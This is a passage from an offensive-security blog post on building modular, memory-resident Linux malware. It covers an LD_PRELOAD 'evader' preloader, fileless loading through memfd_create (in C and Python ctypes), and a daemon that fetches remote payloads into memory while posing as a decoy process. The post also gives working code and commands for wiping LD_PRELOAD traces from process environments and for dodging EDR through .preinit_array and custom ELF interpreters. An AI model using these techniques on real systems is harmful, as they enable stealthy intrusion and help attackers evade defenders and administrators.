     ... */
```

Remember `cgo` shim? We can invoke *any* modeule with the chained preloader:

Example:
```sh
LD_PCMD="r:smtp" LD_MODULE="./lib/shim.so" LD_MODULE_ARGS="hello" LD_PRELOAD=./lib/libctx.so.1 /bin/ls


#from libctx.so.1, our evader/preloader
pointer argv: 0x7ffdb3821408
pointer largv: 0x7ffdb3821408
_mctor: argv[0] = '/bin/ls'
processMetaCommands: enter
LD_PCMD: r:smtp
r => smtp
modload args: hello (5)

#From shim.so cgo
hello

#From /bin/ls
bin  ext  INSTALL.md  lib  log	Log.md	Log_tmp.html  Makefile	README.md  run.sh  src	zafsrv
```

### Memory-resident malware modules.

Useful links:

[FileLess memfd_create](https://x-c3ll.github.io/posts/fileless-memfd_create/)

[Super stealthy droppers](https://0x00sec.org/t/super-stealthy-droppers/3715)

We have built an uber-preloader, that can chain other modules, and can have other fetures like signal handling based paylaod execution, IPC communication and whatever else you can think of and your environment allows you to do. Howevever, there is one small problem: those modules are files. On disk. Scannable and inpectable by EDRs. And admins :) 

Let's see if we can fix that. Well, the way to fix that is to load modules in memory and execute them from memory. Just know, that every time you say the first part of the phrase your system will help you. Every time you get to the second part, your system will fight you. 

On Linux, there are  several ways to operate shared memory as far as files go. You have `tmpfs` filesystem (most often via `/dev/shm`), and you have to be root to mount others. You have POSIX shared memory, memory `mmap()`'d files. Some you cannot execute code from others do not provide you memory only abstration, leaving a file path visible for inspection. 

However, as of kernel 3.17 linux gained a system call  [memfd_create(2)](http://man7.org/linux/man-pages/man2/memfd_create.2.html) 

From the sources:
> memfd_create() creates an anonymous file and returns a file
descriptor that refers to it.  The file behaves like a regular file,
and so can be modified, truncated, memory-mapped, and so on.
However, unlike a regular file, it lives in RAM and has a volatile
backing storage.  Once all references to the file are dropped, it is
automatically released.  Anonymous memory is used for all backing
pages of the file.  Therefore, files created by memfd_create() have
the same semantics as other anonymous memory allocations such as
those allocated using mmap(2) with the MAP_ANONYMOUS flag.

This sounds something like we could use by stuffing a malware module in memory and invoking it via a file descriptor only accessible via `/proc` file system  (mostly mounted on non-embedded Linux).

Example:

```c
shm_fd = memfd_create(s, MFD_ALLOW_SEALING); // flags?
if (shm_fd < 0) {
    log_fatal("RamWorker: memfd_create: Could not open file descriptor\n");
}
```

One the file is in memory we can execute it with [fexecve(3)](https://linux.die.net/man/3/fexecve) (or emulate it with `execve(3)`

To anyone who is looking no `readlink(3)` can be made on it, but beyond that execution will work!

The `memfd_create()`'d file will be a file descriptor of the following format:  

```sh
$ ls -l /proc/56417/fd
lrwx------ 1 root root 64 Feb 17 17:55 0 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:55 1 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:55 2 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:54 3 -> '/memfd:K2J5S6N4 (deleted)'
```

More importantly, this: 
```sh
LD_PCMD="r:smtp" LD_MODULE="./lib/shim.so" LD_MODULE_ARGS="hello" LD_PRELOAD=./lib/libctx.so.1 /bin/ls
```

becomes this:

```sh
LD_PCMD="r:smtp" LD_MODULE="/proc/56417/fd/3" LD_MODULE_ARGS="hello" LD_PRELOAD=./lib/libctx.so.1 /bin/ls
```

EDRs might have a little trouble chasing after this. But wait, what is process id `56417` and how did this module get there?

### Modular Malware Payload Warehouses: Remote module loads

Ok, so we now have an uber loader that can load all kinds of modules, and we know how to drive memory-resident modules. As offensive operators we are lazy, and prefer to build even more modular malware. What if we have a store of modules/paylaods _somewhere_ in memory we can consistenly refer to as we operate. That store will have a protocol to load the remote or local malware modules in memory and we just need to reference them by file descriptors as our uber-preloader did. 

Enter `Zombie Ant Framework Service`. It is an uber preloader assistant. 
 - Daemon. Backgrounds itself, mimics and decoys by specified process name.
 - Accepts commands over socket. Fetches remote payloads and stores them in memory. 
 - Runs an in-memory list of available modules, opens payloads to all local preloders. Provides "Preload As A Serice" capability. LOL 
 - At the request of an operator destages malware modules. 
 - Has JSON command interface to extend commands as you please.

Example of the no-dependency client to operate ZAFSrv, you can build your own.:

```sh
Usage: ./tools/zclient.sh <cmd> [cmd args]

Example: ./tools/zclient.sh listmod
Example: ./tools/zclient.sh loadmod http://127.0.0.1:8080/hax.so
Example: ./tools/zclient.sh unloadmod hax.so
```

```sh
listmod(){
    exec 3<>/dev/tcp/127.0.0.1/$PORT
cat<<! 1>&3
{"command": "listmod"}
!
    timeout 0.5s /bin/cat <&3
}

loadmod(){
    exec 3<>/dev/tcp/127.0.0.1/$PORT
cat<<! 1>&3
{
 "command": "loadmod",
 "args": [
       { "modurl": "$1" }
  ]
}"
!
    timeout 1s /bin/cat <&3
}
unloadmod(){
    exec 3<>/dev/tcp/127.0.0.1/$PORT
cat<<! 1>&3
{
 "command": "unloadmod",
 "args": [
       { "modname": "$1" }
  ]
}"
!
    timeout 1s /bin/cat <&3
}
```

*ZAF Demo*

Now you know what proces `56417` is ;) 

## The Catch 22: Operationalizing Dynamic Preload Cradles

We know how to preload, we have some better ideas on  how to write modules, we have payload warehouses that would stealtholy serve us paths to modularized malware.

```
Q: What came first: ZAF or the preloader?
A: Pypreload, of course.
```

One of the issues hackers face is how do we create stelthy first mile delivery mechanism. If the first cradles is a binary we need to drop on disk, we may lose. Why not then fetch our ZAFSrv whcih will take over memory based paylaod sotrage and mamagement via a non-binary. Maybe a Python script? Do you mean, fetch _and_N execute ZAFsrv in memory? 
Yes, that is what I mean. Python can do `memfd_create()`!
Well, over `ctypes` FFI interface.

Example:
`pypreload.py`

```python

def getMemFd(seed):

    #/usr/include/asm/unistd_32.h:#define __NR_memfd_create 356
    #/usr/include/asm/unistd_64.h:#define __NR_memfd_create 319
    if ctypes.sizeof(ctypes.c_voidp) == 4:
       NR_memfd_create = 356
    else:
       NR_memfd_create = 319

    modMemFd = ctypes.CDLL(None).syscall(NR_memfd_create,seed,1)
    if modMemFd == -1:
        print("Error in Memfd")
        return 0

    modMemPath = "/proc/" + str(os.getpid()) + "/fd/" + str(modMemFd)
    print("PID: ", os.getpid(), "Mem path: ", modMemPath)

    return modMemFd, modMemPath
```

#### Loading Malware Module with PyPreload

Example:

```sh
$ pypreload.py  -t so -l http://127.0.0.1:8080/libmctor.so -d bash -c /bin/ls
```
Here, we fetch our malware module into memory, and execute its fucntionality preloading a decoy command, all in memory.

Consider execution context:

Internal OS file descriptors for pypreload fetcher cradle:

```sh
$ ls -l /proc/56417/fd
lrwx------ 1 root root 64 Feb 17 17:55 0 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:55 1 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:55 2 -> /dev/pts/6
lrwx------ 1 root root 64 Feb 17 17:54 3 -> '/memfd:K2J5S6N4 (deleted)'
lr-x------ 1 root root 64 Feb 17 17:55 4 -> /dev/urandom
lr-x------ 1 root root 64 Feb 17 17:55 5 -> 'pipe:[3478476]'
lr-x------ 1 root root 64 Feb 17 17:55 7 -> 'pipe:[3478477]'
```

Internals of the fetcher referencing the malware module presented over ZAFSrv:

```sh
$ ls -l /proc/56418/fd
lrwx------ 1 root root 64 Feb 17 17:55 0 -> /dev/pts/6
l-wx------ 1 root root 64 Feb 17 17:55 1 -> 'pipe:[3478476]'
l-wx------ 1 root root 64 Feb 17 17:55 2 -> 'pipe:[3478477]'
```

Process tree: Where is Waldo?  ;)

```sh
56417 pts/6    S+     0:00                  |   |   |   \_ bash
56418 pts/6    S+     0:00                  |   |   |       \_ /bin/ls
```

#### Loading and Executing Malware Warehousing ZAFSrv with PyPreload

In the same vaein we can load our ZAFSrv into memory with the pypreload cradle:

```sh
$ pypreload.py  -t bin -l http://127.0.0.1:8080/zaf -d bash
```

Note: as you look at the process table and the `/proc` entries notice thay the parent is gone (pypreload cradle), and the binary loaded (ZAFSrv)

```sh
$ ls -l /proc/56509/fd/
lr-x------ 1 root root 64 Feb 17 18:08 0 -> /dev/null
l-wx------ 1 root root 64 Feb 17 18:08 1 -> /dev/null
lrwx------ 1 root root 64 Feb 17 18:08 2 -> /dev/null
l-wx------ 1 root root 64 Feb 17 18:08 3 -> /tmp/_mf.log
lrwx------ 1 root root 64 Feb 17 18:08 4 -> '/memfd:fa37Jn (deleted)'
lrwx------ 1 root root 64 Feb 17 18:08 5 -> 'socket:[3479923]'
```

Strace sees the following in the logs:

```log
56880 18:26:52.395703 memfd_create("R6YP4OOR", MFD_CLOEXEC) = 3
56884 18:26:52.586221 readlink("/proc/self/exe", "/memfd:R6YP4OOR (deleted)", 4096) = 25
56886 18:26:52.624087 memfd_create("", MFD_CLOEXEC) = 4
56886 18:26:52.632680 memfd_create("fa37Jn", MFD_CLOEXEC) = 4
```

Where is Waldo, really? 

---

### Protecting your Cradles and Preloaders

After the dust settles, and your EDRs are hopefully lost in the forest of process trees, memory descriptor that lead nowhere and zombies, and ants (lol), you have to remember that thenext time you face them they will be ready. Take steps to protect your payloads. Either via additional evastion capabikities, encryption, or other novel ways to be curious, inquisitive and overserving. 

Some ideas and tips below, I also hope defensive hackers take note ;)

#### Spring Cleaning, Rootkit style

[Really good writeup on hpw to detect LD_PRELOAD and clean it](https://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/)

Take lessons from rootkits to remove your LD_PRELOAD presence from processes (ZAFSrv does that), so does the preload PoC.

Example:

```c
// always evade: clean LD_PRELOAD pointers, LD_PCMD
    cleanEnv("LD_PRELOAD", strlen("LD_PRELOAD") );
    cleanEnv("LD_PCMD", strlen("LD_PCMD") );
    cleanEnv("LD_BG", strlen("LD_BG") );

// Search and zeroize env variables we want to hide
void cleanEnv(char* ldvar, int ldlen){

     // for some reson *env walk / memset does not rewind. Restart.
     lenvp = lenvp_start;

     // a. remove from /proc/pid/environ
     while (*lenvp) {
      if (strncmp(*lenvp, ldvar, ldlen) == 0){
        memset(*lenvp, 0, strlen(*lenvp));
          break;
        }

      lenvp++;
    }

     // b. remove from process memory if present to be sure
     unsetenv(ldvar);
}
```

#### Race to preload

If someone used `.init` et al to preload your cradles. e.g. sandbox, you could still survive:


> Q: Remember `.init_array` ... ? 

> A: Yes, and I counter: `.preinit_array`

Example: 

```c
__attribute__((section(".preinit_array"), used)) static typeof(preinit) *preinit_p = preinit;
```

```sh
$ LD_PRELOAD=ext/hax.so bin/main_init 
>>> preinit
>>init
argv[0] = bin/main_init
--- Before main ---
>main
>>fini
```

#### No Main(), no gain ..?

1.Main(), redefined

`nomain.c`:

```c
// gcc -nostartfiles -o nomain nomain.c 
/* when called :
    $ LD_PRELOAD="./nomain" /bin/cat 
        ctor invokes, "main" does not 

    when called :
    $ ./nomain 
        ctor invokes, "main" invokes
*/
__attribute__((constructor)) static void myctor(int argc, char **argv, char* envp[]){

    printf("in ctor\n");
}
int _(void);
void _start()
{
    int x = _(); //calling custom main function 
    exit(x);
}
int _() {
    printf("in main: %s\n", __FUNCTION__);
    while (1) ;
    return 0;
}
```

2.Hiding in plain symbol sight

`nomain_entry.c`:

```c
int _(void);
void __data_frame_e()
{ 
    int x = _(); //calling custom main function 
    exit(x);
} 
int _() {
    printf("in main: %s\n", __FUNCTION__);
    while (1) ;
    return 0;
}
```

3.Alternative ELF loaders.

If you are allowed to bring in other elf loaders, you could point an executable to soemthing that may not be (yet) instrumented:

`nomain_interp.c`:

```c
// gcc -shared -Wl,-e,fn_no_main nomain.c -o nomain.so

// 1. Static patch via 
// $ patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2

// Dynamic assaignment to .interp section:

//Was: const char my_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";

// Now:
const char my_interp[] __attribute__((section(".interp"))) = "/usr/local/bin/gelfload-ld-x86_64";

int fn_no_main() {
    printf("This is a function without main\n");
    exit(0);
}
```

## Summary

We have walked through ideas on how to write modular malware suitable for preloading tasks. We have built the preloader with extensible capabilities and features. We have talked about memory based payload storage and invocation. We have seen how to fetch and execute binaries and it's dependencies in memory, and to create offensive services. I certainly hope you have learned something from this as I did and do.

This adventure in modular malware and preloading has just begun. There are many exciting things to be put together, discussed, observed and hacked. Stay curious!


The code for both the primitives and fo the ZAF Service is open source and will be made available at: 


https://github.com/dsnezhkov/zombieant


## Refs
Thank you to those who provided initial information on memory based execution, preload detection and SO community for such wealth of knowledge on C/linkers/loaders/compilers. Probably incomplete list below (if I missed anyone please reach out):

https://x-c3ll.github.io/posts/fileless-memfd_create/

https://0x00sec.org/t/super-stealthy-droppers/3715

https://github.com/lattera/glibc/blob/master/csu/gmon-start.c

https://stackoverflow.com/questions/12697081/what-is-gmon-start-symbol

https://github.com/dvarrazzo/py-setproctitle/tree/master/src

https://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/

https://gist.github.com/apsun/1e144bf7639b22ff0097171fa0f8c6b1

